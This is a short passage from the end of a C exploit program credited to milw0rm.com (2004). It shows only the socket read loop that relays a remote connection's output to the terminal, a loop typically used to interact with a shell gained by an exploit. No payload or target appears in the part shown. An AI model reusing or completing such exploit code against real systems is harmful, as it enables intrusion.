                    if(FD_ISSET(sockfd, &fds))
                        {
                            if((cnt = read(sockfd, buf, 1024)) < 1)
                                {
                                    if(errno == EWOULDBLOCK || errno == EAGAIN)
                                        continue;
                                    else
                                        break;
                                }
                            write(1, buf, cnt);
                        }
                }
        }
    exit(0);
}


// milw0rm.com [2004-06-25]